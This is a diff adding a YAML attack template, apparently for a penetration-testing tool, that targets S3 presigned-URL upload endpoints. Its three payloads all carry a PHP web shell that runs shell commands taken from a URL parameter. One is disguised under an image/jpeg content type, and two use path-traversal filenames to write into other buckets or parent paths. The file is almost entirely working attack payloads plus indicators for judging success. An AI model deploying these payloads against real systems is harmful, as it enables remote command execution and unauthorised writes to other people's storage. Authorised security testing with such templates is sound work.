@@ -1,0 +1,45 @@
+name: "AWS S3 Presigned URL Attack"
+description: "Tests S3 presigned URL upload endpoints for ACL manipulation and path traversal"
+author: "@HaakimSec"
+version: "1.0"
+tech_stack: "all"
+
+target:
+  endpoint: "/api/generate-upload-url"
+  method: "POST"
+  param: "file"
+
+headers:
+  Content-Type: "application/json"
+
+payloads:
+  - name: "S3 ACL manipulation"
+    filename: "test.php"
+    extension: ".php"
+    content_type: "image/jpeg"
+    body: |
+      <?php system($_GET['cmd']); ?>
+    tags: ["s3", "acl", "php"]
+
+  - name: "S3 path traversal"
+    filename: "../../other-bucket/shell.php"
+    extension: ".php"
+    body: |
+      <?php system($_GET['cmd']); ?>
+    tags: ["s3", "path-traversal", "cross-bucket"]
+
+  - name: "S3 bucket enumeration"
+    filename: "../../../shell.php"
+    extension: ".php"
+    body: |
+      <?php system($_GET['cmd']); ?>
+    tags: ["s3", "enumeration"]
+
+success_indicators:
+  - "uploadUrl"
+  - "presignedUrl"
+  - "\"url\":\"https://"
+
+failure_indicators:
+  - "Access Denied"
+  - "Invalid bucket"
